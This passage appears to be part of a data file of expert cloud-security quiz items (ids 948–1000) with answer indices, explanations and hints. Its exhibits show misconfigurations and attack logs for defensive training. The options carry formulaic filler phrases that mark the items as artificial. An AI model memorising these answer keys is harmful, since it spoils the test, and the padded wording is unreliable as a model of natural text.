    id: 948, rank: 3, role: "cloud-security", topic: "Envelope Key Hierarchy", difficulty: "EXPERT",
    q: "Why use a key hierarchy with a master key and data keys?",
    options: ["It removes the need for any access policy","It limits exposure and allows efficient rotation","It stores keys in plain text","It makes every key the same size"],
    correct: 1, why: "Envelope encryption protects data keys with a master key.",
    hint: "Envelope encryption."
  },
  {
    id: 949, rank: 3, role: "cloud-security", topic: "API Gateway Exhibit", difficulty: "EXPERT",
    exhibit: "GET /customers/{id}   authorizer=NONE   rate_limit=none\nPOST /orders          authorizer=JWT    rate_limit=100/min\nGET /health           authorizer=NONE   rate_limit=10/s",
    q: "What does this gateway configuration leave open?",
    options: ["A route protected by token validation","A route that requires mutual TLS","An unauthenticated route that returns customer records, as a general rule","A route with strict rate limits"],
    correct: 2, why: "A route with no authorizer exposes data to anyone.",
    hint: "Authorizer: NONE."
  },
  {
    id: 950, rank: 3, role: "cloud-security", topic: "Cross-Cloud Identity", difficulty: "EXPERT",
    q: "Which approach best gives one consistent identity across several cloud providers?",
    options: ["A central identity provider federated to each cloud","Anonymous access to every console, as a general rule","Separate local users in each provider, until the next scheduled review takes place","A shared password for all providers, as a general rule"],
    correct: 0, why: "Central federation gives one place for lifecycle and MFA.",
    hint: "Federate."
  },
  {
    id: 951, rank: 3, role: "cloud-security", topic: "Recovery Architecture", difficulty: "EXPERT",
    q: "Which design best protects backups from ransomware that has admin rights?",
    options: ["Backups on the same server as production","Backups editable by all administrators","Immutable copies in a separate locked account, as a general rule","Backups that are never tested"],
    correct: 2, why: "Immutability and separation stop attackers deleting recovery data.",
    hint: "Immutable and separate."
  },
  {
    id: 952, rank: 3, role: "cloud-security", topic: "Policy as Code", difficulty: "EXPERT",
    q: "What is the main benefit of policy as code for cloud governance?",
    options: ["Policies that only apply after an incident, as a general rule","Consistent automated checks that are versioned and reviewed","Manual approvals for every small change","Policies written in a slide deck"],
    correct: 1, why: "Code makes rules testable and repeatable.",
    hint: "Automate rules."
  },
  {
    id: 953, rank: 3, role: "cloud-security", topic: "Detective Control Exhibit", difficulty: "EXPERT",
    exhibit: "Finding: UnauthorizedAccess:IAMUser/MaliciousIPCaller.Custom\nPrincipal: svc-reporting\nAction: ListBuckets, GetObject x 3,900\nSource: 192.0.2.150 (listed in threat feed)",
    q: "What does this finding most likely indicate?",
    options: ["An administrator reading documentation, as a general rule","Unusual API calls from a known malicious address","A normal deployment by the pipeline, as a general rule","A scheduled security scan"],
    correct: 1, why: "Threat intelligence matches suggest hostile activity.",
    hint: "Threat list match."
  },
  {
    id: 954, rank: 3, role: "cloud-security", topic: "Container Runtime Security", difficulty: "EXPERT",
    q: "Which control best limits damage if a container is compromised?",
    options: ["Opening every port for debugging, as a general rule","Mounting the host disk into the container, as soon as practical","Running as non-root with a read-only filesystem","Running with full host privileges, until the next scheduled review takes place"],
    correct: 2, why: "Least privilege at runtime reduces escape and tamper options.",
    hint: "Non-root, read-only."
  },
  {
    id: 955, rank: 3, role: "cloud-security", topic: "Security Review Triage", difficulty: "EXPERT",
    q: "A new design has three open risks. What is the BEST way to decide which to fix before launch?",
    options: ["Fix the one that is easiest to close","Rank by impact and likelihood and fix the highest first","Defer all three until the first incident, as a general rule","Fix the one the vendor mentioned first, as a general rule"],
    correct: 1, why: "Fixing the easiest is the runner-up as it shows progress, but it may leave the largest risk open.",
    hint: "Risk-based order."
  },
  {
    id: 956, rank: 3, role: "cloud-security", topic: "Shared Image Pipeline Exhibit", difficulty: "EXPERT",
    exhibit: "FROM python:latest\nRUN pip install -r requirements.txt\nUSER root\n# no signature check, no digest pin",
    q: "What is the weakness in this image build pipeline?",
    options: ["The image is scanned before release and signed after the build in an isolated worker","The build runs in an isolated worker","The base image uses a floating tag without verification, as a general rule","The image is signed after the build"],
    correct: 2, why: "Floating tags can change silently and introduce unreviewed content.",
    hint: "Tag is :latest."
  },
  {
    id: 957, rank: 3, role: "cloud-security", topic: "Cloud Exit Planning", difficulty: "EXPERT",
    q: "Why should a cloud design include an exit and data return plan?",
    options: ["To keep keys in the provider forever","To retrieve, and delete data safely if the contract ends, as a general rule","To avoid ever using backups as the provider already keeps a copy of every file safe","To stop all monitoring"],
    correct: 1, why: "Exit planning protects data and continuity.",
    hint: "Plan the exit."
  },
  {
    id: 958, rank: 3, role: "cloud-security", topic: "Logging Cost Balance", difficulty: "EXPERT",
    q: "Which approach best balances logging cost and detection value?",
    options: ["Log everything forever at the highest tier, and revisit the decision after the next release","Keep critical logs hot, and archive the rest at lower cost, as a general rule","Disable all logs to save money, and revisit the decision after the next release","Keep only the logs from yesterday, and revisit the decision after the next release"],
    correct: 1, why: "Tiering retains evidence while controlling cost.",
    hint: "Tiering."
  },
  {
    id: 959, rank: 3, role: "cloud-security", topic: "Segmentation of Admin Plane", difficulty: "EXPERT",
    q: "Why separate the management plane from the data plane in cloud design?",
    options: ["A compromised workload should not control the cloud account","It makes applications run faster","It removes the need for logging","It lets everyone share admin credentials"],
    correct: 0, why: "Separation limits how far a workload compromise spreads.",
    hint: "Limit blast radius."
  },
  {
    id: 960, rank: 3, role: "cloud-security", topic: "Service Mesh Trust", difficulty: "EXPERT",
    q: "What does mutual TLS in a service mesh provide between services?",
    options: ["Each side proves its identity and the traffic is encrypted","Removal of all authorisation rules","Only faster response times","A public view of internal traffic"],
    correct: 0, why: "mTLS gives authentication and confidentiality between workloads.",
    hint: "Both sides authenticate."
  },
  {
    id: 961, rank: 4, role: "cloud-security", topic: "Multi-Cloud Control Plane", difficulty: "EXPERT",
    q: "An enterprise runs three cloud providers and wants consistent security posture. What is the BEST strategy?",
    options: ["Quarterly spreadsheets that compare settings between providers, in most cases","One provider's native tool applied to all three by hand, as a general rule","Common baseline controls expressed as code, and enforced per provider","Separate teams that each choose their own controls and tools"],
    correct: 2, why: "Separate team choices are the runner-up as they fit each platform, but they give no common baseline and no reliable view of risk.",
    hint: "Baseline as code."
  },
  {
    id: 962, rank: 4, role: "cloud-security", topic: "Compromised Pipeline Role", difficulty: "EXPERT",
    exhibit: "02:14 AssumeRole  role=deploy-pipeline  src=198.51.100.23\n02:15 CreateUser   name=svc-backup2\n02:15 AttachUserPolicy  AdministratorAccess\n02:16 CreateAccessKey  user=svc-backup2\n02:18 ConsoleLogin user=svc-backup2 src=198.51.100.23",
    q: "What does this sequence of events indicate?",
    options: ["A pipeline role was abused to create persistence in another account","A developer testing a new dashboard during working hours, as a general rule","A normal release that finished successfully last night, as a general rule","A scheduled rotation of access keys by the platform team, as a general rule"],
    correct: 0, why: "Creating users and keys after a pipeline assumes a role is a persistence pattern.",
    hint: "Who created the new user?"
  },
  {
    id: 963, rank: 4, role: "cloud-security", topic: "Blast Radius Calculation", difficulty: "EXPERT",
    q: "Which design change most reduces blast radius for a shared cloud platform?",
    options: ["Shared access keys that rotate once a year by hand, in most cases","Per-team accounts with scoped roles and organisation guardrails","One large account with a single administrator group, as a general rule","A central team that holds every permission for everyone, in most cases"],
    correct: 1, why: "Account-level isolation limits what any one compromise can reach.",
    hint: "Isolation boundary."
  },
  {
    id: 964, rank: 4, role: "cloud-security", topic: "Evidence Preservation Cloud", difficulty: "EXPERT",
    q: "During a cloud investigation which step is BEST done first to protect volatile evidence?",
    options: ["Wipe the volume and rebuild it from the latest image, and review the outcome at the next monthly meeting","Reboot the host to clear any running malware, and revisit the decision after the next release","Isolate the host and capture memory and disk snapshots, where that is practical","Terminate the instance, and the attacker is removed"],
    correct: 2, why: "Terminating is the runner-up as it stops the attacker, but it destroys memory and the running state that investigators need.",
    hint: "Evidence order."
  },
  {
    id: 965, rank: 4, role: "cloud-security", topic: "Key Compromise Response", difficulty: "EXPERT",
    q: "A signing key may have been exposed. Which response is most complete?",
    options: ["Rename the key and attackers cannot find it again","Revoke and replace the key then review all uses of it","Wait to see whether anyone abuses it in the next month","Reduce the logging level, and fewer alerts appear"],
    correct: 1, why: "Revocation, replacement and a usage review contain and scope the exposure.",
    hint: "Revoke and review."
  },
  {
    id: 966, rank: 4, role: "cloud-security", topic: "Cross-Account Trust Exhibit", difficulty: "EXPERT",
    exhibit: "\"Principal\":{\"AWS\":\"arn:aws:iam::444455556666:root\"}\n\"Action\":\"sts:AssumeRole\"\n\"Condition\":{}",
    q: "What is the weakness in this role trust policy?",
    options: ["It expires the session after fifteen minutes","It trusts any principal from the partner account without conditions","It requires MFA for every session that assumes it","It limits trust to one named role with an external ID"],
    correct: 1, why: "Whole-account trust without conditions lets any identity there assume the role.",
    hint: "Look at the Principal."
  },
  {
    id: 967, rank: 4, role: "cloud-security", topic: "Detection Engineering Tuning", difficulty: "EXPERT",
    q: "A cloud detection fires 400 times a day with almost no real incidents. What is the BEST improvement?",
    options: ["Raise its severity and analysts review every alert","Disable the rule, and the queue is easier to manage","Send every alert directly to the head of security","Tune it with context such as asset criticality and known automation, wherever possible"],
    correct: 3, why: "Disabling is the runner-up as it removes noise, but it also removes coverage for the behaviour the rule was written to catch.",
    hint: "Tune, do not delete."
  },
  {
    id: 968, rank: 4, role: "cloud-security", topic: "Resilience Test Exhibit", difficulty: "EXPERT",
    exhibit: "Service: payments-db\nTarget RTO: 60 min   Target RPO: 5 min\nTest: restore in secondary region\nActual RTO: 4 h 20 min   Actual RPO: 38 min\nBlocker: encryption key not replicated",
    q: "What does this recovery test result show?",
    options: ["Recovery finished well inside the agreed target, in most cases","Recovery missed its target, and the process needs improvement","The network was never connected to the primary site","Backups were never created for the database"],
    correct: 1, why: "The measured recovery time is longer than the objective.",
    hint: "Compare RTO and actual."
  },
  {
    id: 969, rank: 4, role: "cloud-security", topic: "Quantifying Cloud Risk", difficulty: "EXPERT",
    q: "Which approach best expresses cloud risk to executives?",
    options: ["The number of rules in the firewall","The name of the provider region","Business impact and likelihood tied to critical services","A list of every raw finding from the scanner, in most cases"],
    correct: 2, why: "Executives need risk in terms of business outcomes.",
    hint: "Business terms."
  },
  {
    id: 970, rank: 4, role: "cloud-security", topic: "Delegated Administration", difficulty: "EXPERT",
    q: "Which design best delegates admin duties while keeping control of the organisation?",
    options: ["Permission boundaries and guardrails around delegated admins","One shared root user for the whole company","No delegation, and every change through one person, in most cases","Full organisation owner rights for every team lead, in most cases"],
    correct: 0, why: "Boundaries let teams work without exceeding limits.",
    hint: "Boundaries."
  },
  {
    id: 971, rank: 4, role: "cloud-security", topic: "Third-Party Access Exhibit", difficulty: "EXPERT",
    exhibit: "Vendor: AcmeSupport\nRole: AdministratorAccess  (no expiry)\nTrust: arn:aws:iam::777788889999:root (no external ID)\nLogging of vendor sessions: disabled",
    q: "What risk does this vendor access setup create?",
    options: ["A scoped role that requires approval each time, as a general rule","Standing admin access with no expiry or monitoring","A role limited to one resource and region, in most cases","A read-only role that expires after a day"],
    correct: 1, why: "Broad permanent vendor access is a common route for supply chain compromise.",
    hint: "Permanent admin."
  },
  {
    id: 972, rank: 4, role: "cloud-security", topic: "Data Classification Controls", difficulty: "EXPERT",
    q: "How should controls differ for restricted and public data in the cloud?",
    options: ["Restricted data gets stronger encryption, and tighter access","Public data receives the strongest controls only, in most cases","Both receive identical settings regardless of value","Restricted data may be shared by public link"],
    correct: 0, why: "Controls should scale with data sensitivity.",
    hint: "Match sensitivity."
  },
  {
    id: 973, rank: 4, role: "cloud-security", topic: "Customer Key Revocation", difficulty: "EXPERT",
    q: "What happens to data protected by a customer key if that key is deleted without a backup?",
    options: ["The data cannot be decrypted by anyone","The data becomes public for thirty days","The data is automatically decrypted for admins","The data moves to a different region"],
    correct: 0, why: "Without the key the ciphertext is unrecoverable.",
    hint: "No key, no data."
  },
  {
    id: 974, rank: 4, role: "cloud-security", topic: "Architecture Review Exhibit", difficulty: "EXPERT",
    exhibit: "Public subnet: ALB, bastion, db-primary (public IP 52.x.x.x)\nPrivate subnet: app-servers\nSecurity group db: 5432 from 0.0.0.0/0\nLogs: central security account",
    q: "Which flaw in this design is most serious?",
    options: ["The logs are shipped to a separate account","The database sits in a public subnet with a public address","The app tier sits in a private subnet","The load balancer terminates TLS in the public subnet, in most cases"],
    correct: 1, why: "A public database is directly reachable from the internet.",
    hint: "Where is the database?"
  },
  {
    id: 975, rank: 4, role: "cloud-security", topic: "Insider Threat in Cloud", difficulty: "EXPERT",
    q: "A departing administrator still has active cloud access. What is the BEST action?",
    options: ["Reduce their permissions slowly over several months, until the next scheduled review takes place","Disable their access immediately and review their recent activity","Ask them to delete their own credentials, and review the outcome at the next monthly meeting","Wait until their notice period finishes to avoid friction"],
    correct: 1, why: "Waiting is the runner-up as it avoids friction, but it leaves privileged access open during the highest-risk window.",
    hint: "Act at departure."
  },
  {
    id: 976, rank: 4, role: "cloud-security", topic: "Federated Session Risk", difficulty: "EXPERT",
    q: "Which control best reduces the risk of stolen federated sessions?",
    options: ["Sharing sessions between team members","Disabling logging for federated users, until the next scheduled review takes place","Very long tokens that never expire","Short token lifetimes, and conditional access checks, in most cases"],
    correct: 3, why: "Short lifetimes and checks limit stolen token use.",
    hint: "Short tokens."
  },
  {
    id: 977, rank: 4, role: "cloud-security", topic: "Cloud Forensics Readiness", difficulty: "EXPERT",
    q: "Which preparation best helps a future cloud investigation?",
    options: ["No logging to reduce the storage bill, as a general rule","Logs kept only on each server for one week, in most cases","Central immutable logs with agreed retention and access","Logs shared with every developer"],
    correct: 2, why: "Evidence must exist and be trustworthy when needed.",
    hint: "Prepare evidence."
  },
  {
    id: 978, rank: 4, role: "cloud-security", topic: "Egress Exfiltration Exhibit", difficulty: "EXPERT",
    exhibit: "src=10.4.8.17 (hr-db-replica)\ndst=203.0.113.200:443 (not in allow list)\nbytes_out=41.8 GB over 52 min\nnormal daily egress for this host: 0.2 GB",
    q: "What does this network summary suggest?",
    options: ["A server sending unusually large data to an unknown external address, as a general rule","A normal software update download","A health check from the load balancer","A scheduled backup to the approved region"],
    correct: 0, why: "Large outbound transfers to unknown hosts suggest exfiltration.",
    hint: "Outbound volume."
  },
  {
    id: 979, rank: 4, role: "cloud-security", topic: "Compliance Mapping", difficulty: "EXPERT",
    q: "How should an architect map cloud controls to several regulations?",
    options: ["Ignore regulations until an audit begins, as a first step","Copy controls from another company unchanged, wherever possible","Write a separate control set for each regulation","Define common controls and map each to the regulations"],
    correct: 3, why: "Common controls reduce duplicated work and gaps.",
    hint: "Common control set."
  },
  {
    id: 980, rank: 4, role: "cloud-security", topic: "Risk Acceptance Process", difficulty: "EXPERT",
    q: "What should a formal risk acceptance for a cloud exception include?",
    options: ["An open-ended exception with no review","A verbal agreement with no record","A decision made by the engineer alone","Named owner, expiry date, compensating controls and approval, as a general rule"],
    correct: 3, why: "Accepted risk needs ownership and a review date.",
    hint: "Owner and expiry."
  },
  {
    id: 981, rank: 4, role: "cloud-security", topic: "Ransomware in Cloud Storage", difficulty: "EXPERT",
    q: "Mass object deletion is detected in a cloud bucket. What is the BEST first containment action?",
    options: ["Ask users whether they deleted the files","Suspend the identity and enable object lock or versioning recovery, as a general rule","Wait for the deletions to finish before acting, and review the outcome at the next monthly meeting","Delete the bucket, and nothing else is lost"],
    correct: 1, why: "Deleting the bucket is the runner-up as it stops further loss, but it destroys the remaining data and the evidence.",
    hint: "Stop the actor."
  },
  {
    id: 982, rank: 4, role: "cloud-security", topic: "Platform Security Roadmap", difficulty: "EXPERT",
    q: "Which factor should most influence the order of a cloud security roadmap?",
    options: ["The personal preference of the loudest engineer","The order in which tools were purchased","Whichever item is the cheapest to start","Risk reduction for critical assets against effort required"],
    correct: 3, why: "Prioritisation should follow risk.",
    hint: "Risk first."
  },
  {
    id: 983, rank: 4, role: "cloud-security", topic: "Identity Threat Exhibit", difficulty: "EXPERT",
    exhibit: "09:01 login user=cfo src=Lisbon, PT MFA=push ok\n09:07 login user=cfo src=Lagos, NG MFA=push ok (new device)\n09:09 MFA device added user=cfo device=unknown\n09:12 mailbox rule created: forward all to external",
    q: "What does this authentication log show?",
    options: ["A normal login pattern from the office","A failed login by mistake","Impossible travel followed by a new MFA device registration, as a general rule","A scheduled service sign-in"],
    correct: 2, why: "Rapid sign-ins from distant places then a new device suggest takeover.",
    hint: "Two countries in minutes."
  },
  {
    id: 984, rank: 4, role: "cloud-security", topic: "Landing Zone Drift Controls", difficulty: "EXPERT",
    q: "What best prevents teams from weakening baseline controls in their accounts?",
    options: ["A request in the team chat","Trust in team leads, and revisit the decision after the next release","A quarterly reminder email","Preventive guardrails at the organisation level, as a general rule"],
    correct: 3, why: "Preventive controls apply regardless of account administrators.",
    hint: "Guardrails."
  },
  {
    id: 985, rank: 4, role: "cloud-security", topic: "Customer Data in Logs", difficulty: "EXPERT",
    q: "Debug logs contain full card numbers. What is the best remediation?",
    options: ["Move the logs to a cheaper tier, and review the outcome at the next monthly meeting","Rename the log group, and revisit the decision after the next release","Make the log file read only for all staff","Stop logging it and mask data at the source then purge old logs"],
    correct: 3, why: "Sensitive data should not be logged and existing copies must be removed.",
    hint: "Remove at source."
  },
  {
    id: 986, rank: 4, role: "cloud-security", topic: "Resource Hijacking", difficulty: "EXPERT",
    q: "Which signal best indicates cryptomining abuse in a cloud account?",
    options: ["Sustained high compute on unfamiliar instances in new regions, as a general rule","A short CPU peak during a batch job","A small increase in storage use","A new tag on a database"],
    correct: 0, why: "Mining shows as unplanned compute that persists.",
    hint: "Unfamiliar compute."
  },
  {
    id: 987, rank: 4, role: "cloud-security", topic: "Shared Services Risk", difficulty: "EXPERT",
    q: "A shared service account is used by 30 applications. What is the BEST improvement?",
    options: ["Give each application its own scoped identity and rotate secrets","Remove all monitoring for that account, until the next scheduled review takes place","Keep it shared, and the team has fewer accounts","Increase its password length, and leave it shared"],
    correct: 0, why: "Keeping it shared is the runner-up as it is simple, but one compromise exposes all thirty applications and attribution is lost.",
    hint: "Unique identities."
  },
  {
    id: 988, rank: 4, role: "cloud-security", topic: "Security Architecture Metrics", difficulty: "EXPERT",
    q: "Which metric best shows the effect of preventive cloud guardrails?",
    options: ["More tickets closed per analyst","A longer list of exceptions","Fewer high-risk misconfigurations reaching production, as a general rule","A bigger monthly log volume"],
    correct: 2, why: "A drop in risky changes shows prevention is working.",
    hint: "Prevented issues."
  },
  {
    id: 989, rank: 4, role: "cloud-security", topic: "Resilience of Identity", difficulty: "EXPERT",
    q: "What is the best protection against loss of the central identity provider?",
    options: ["Removing all local accounts","Tested break-glass access, and a documented recovery plan, in most cases","Assuming the provider never fails, and review the outcome at the next monthly meeting","Storing admin passwords in chat, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Identity is a single point of failure that needs a tested fallback.",
    hint: "Tested fallback."
  },
  {
    id: 990, rank: 4, role: "cloud-security", topic: "Storage Policy Exhibit", difficulty: "EXPERT",
    exhibit: "{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::company-reports/*\"}\nBlockPublicAccess: off",
    q: "What is the effect of this bucket policy?",
    options: ["Objects are encrypted with a customer key","Only the account owner can read objects","Anyone on the internet can read every object","Only listed roles can read objects"],
    correct: 2, why: "A wildcard principal with GetObject opens the bucket to everyone.",
    hint: "Principal: *."
  },
  {
    id: 991, rank: 4, role: "cloud-security", topic: "Cloud Detection Coverage", difficulty: "EXPERT",
    q: "Which approach best finds gaps in cloud detection coverage?",
    options: ["Count the total number of alerts, until the next scheduled review takes place","Map detections to attacker techniques and test them, as a first step","Ask each team if they feel secure, and revisit the decision after the next release","Wait for a real incident, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Mapping and testing show what is and is not detected.",
    hint: "Map and test."
  },
  {
    id: 992, rank: 4, role: "cloud-security", topic: "Container Escape Response", difficulty: "EXPERT",
    q: "A container is suspected of breaking out to the host. What is the best next step?",
    options: ["Isolate the node then preserve evidence and rotate node credentials","Ignore it until the next scan, until the next scheduled review takes place","Restart the container, and carry on, and revisit the decision after the next release","Delete the namespace at once, and review the outcome at the next monthly meeting"],
    correct: 0, why: "The node may be compromised so credentials and evidence matter.",
    hint: "Treat the node."
  },
  {
    id: 993, rank: 4, role: "cloud-security", topic: "Policy Exception Exhibit", difficulty: "EXPERT",
    exhibit: "EX-014 public bucket       owner=none  expires=never\nEX-022 open SSH to 0.0.0.0 owner=none  expires=never\nEX-031 no MFA for admin    owner=none  expires=never\nEX-040 unencrypted volume  owner=infra expires=2026-12-31",
    q: "What is the main issue with this exception list?",
    options: ["Exceptions are approved with an expiry","Each exception has a named owner","Many exceptions never expire and have no owner","Compensating controls are recorded"],
    correct: 2, why: "Permanent unowned exceptions turn into hidden risk.",
    hint: "Expiry and owner."
  },
  {
    id: 994, rank: 4, role: "cloud-security", topic: "Supply Chain in Cloud Builds", difficulty: "EXPERT",
    q: "Which control best protects a cloud build pipeline from dependency tampering?",
    options: ["Pinned dependencies verified against signatures and hashes","Allowing any internet package source, and review the outcome at the next monthly meeting","Pulling the latest version on every build, wherever possible","Disabling build logs, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Pinning and verification prevent silent substitution.",
    hint: "Pin and verify."
  },
  {
    id: 995, rank: 4, role: "cloud-security", topic: "Account Takeover Response", difficulty: "EXPERT",
    q: "A cloud admin account is confirmed compromised. Which sequence is best?",
    options: ["Email the user, and wait for a reply","Reset only the password and close the case","Contain the sessions then investigate, and reset all credentials, as a general rule","Delete the account, and take no further action, until the next scheduled review takes place"],
    correct: 2, why: "Session revocation, scoping and credential resets are all needed.",
    hint: "Contain then scope."
  },
  {
    id: 996, rank: 4, role: "cloud-security", topic: "Workload Credential Theft", difficulty: "EXPERT",
    exhibit: "AssumedRole: i-0a9c-app-role\nUsed from: 203.0.113.58 (external, not the instance)\nCalls: ListSecrets, GetSecretValue x 64\nInstance egress IP: 52.14.x.x",
    q: "What does this alert pattern show about a compromised workload?",
    options: ["Role credentials used from an address outside the cloud","A health probe from the managed load balancer to the application port","A scheduled job that rotates its own session token every few hours","A normal call from the application to its own database during peak hours"],
    correct: 0, why: "Role credentials issued to an instance should only be used from that instance.",
    hint: "Source address of the role use."
  },
  {
    id: 997, rank: 4, role: "cloud-security", topic: "Residual Risk Statement", difficulty: "EXPERT",
    q: "Which wording is the best residual risk statement for a cloud exception?",
    options: ["There is no risk as the cloud provider handles all of it for us","The risk belongs to whoever happens to notice it first at some later point","The risk is fine and nobody needs to look at it again after this meeting","Medium risk of exposure until the guardrail ships next quarter"],
    correct: 3, why: "A good statement names the impact and likelihood and the date it will be reviewed.",
    hint: "Impact and date."
  },
  {
    id: 998, rank: 4, role: "cloud-security", topic: "Rotation Failure Exhibit", difficulty: "EXPERT",
    exhibit: "secret            last_rotated  used_by\nprod/db-master    612 days ago  41 services\nprod/api-signing  230 days ago  3 services\nstaging/db        4 days ago    2 services",
    q: "What is the main problem shown by this secrets report?",
    options: ["Secrets are fetched at runtime by scoped roles that cannot read others","Old secrets are removed after each rotation and the logs are archived","All secrets rotate on schedule and each one has a single named owner","Production credentials have not rotated, and one is shared widely"],
    correct: 3, why: "Stale and shared secrets increase exposure and make attribution harder.",
    hint: "Last rotated and used by."
  },
  {
    id: 999, rank: 4, role: "cloud-security", topic: "Segmentation Test Results", difficulty: "EXPERT",
    q: "A penetration test summary says a test host could reach the payment network. What is the best architectural response?",
    options: ["Rename the zones, and they look separate on the network diagram","Accept it as the host was only a test system, and not a real server","Add and test segmentation controls between those zones","Remove the report from the audit file as the testers have already left"],
    correct: 2, why: "Segmentation must be enforced and then tested again to prove the finding is closed.",
    hint: "Fix then retest."
  },
  {
    id: 1000, rank: 4, role: "cloud-security", topic: "Metrics for Detection Speed", difficulty: "EXPERT",
    q: "Which pair of measures best shows how quickly a cloud team handles threats?",
    options: ["Number of tools in use, and the number of dashboards that the team keeps","Number of staff on the team, and the number of meetings that they hold","Size of the log archive, and the size of the storage that holds all of it","Mean time to detect, and mean time to contain, in most cases"],
    correct: 3, why: "Detection and containment times describe how quickly threats are handled.",
    hint: "Detect and contain."
  }
];
